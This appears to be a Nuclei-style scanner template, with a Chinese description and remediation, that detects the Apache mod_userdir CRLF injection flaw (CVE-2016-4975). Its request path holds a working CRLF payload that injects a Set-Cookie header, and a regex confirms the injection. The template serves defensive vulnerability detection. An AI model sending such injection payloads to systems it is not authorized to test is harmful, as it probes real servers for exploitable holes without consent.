id: CVE-2016-4975
info:
  name: Apache mod_userdir CRLF injection
  author:
  - l0ne1y
  description: |-
    Apache mod_userdir CRLF注入漏洞
    可能的 CRLF 注入允许对使用 mod_userdir 的站点进行 HTTP 响应拆分攻击。此问题已通过 2.4.25 和 2.2.32 中的更改得到缓解，这些更改禁止将 CR 或 LF 注入“位置”或其他出站标头键或值。已在 Apache HTTP Server 2.4.25 中修复（受影响的 2.4.1-2.4.23）。已在 Apache HTTP Server 2.2.32 中修复（受影响的 2.2.0-2.2.31）。
  severity: medium
  remediation: |+
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://httpd.apache.org/security/vulnerabilities_22.html#CVE-2016-4975
    https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2016-4975

requests:
- matchers:
  - type: regex
    part: header
    regex:
    - (?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)
  path:
  - '{{BaseURL}}/~user/%0D%0ASet-Cookie:crlfinjection'
  method: GET
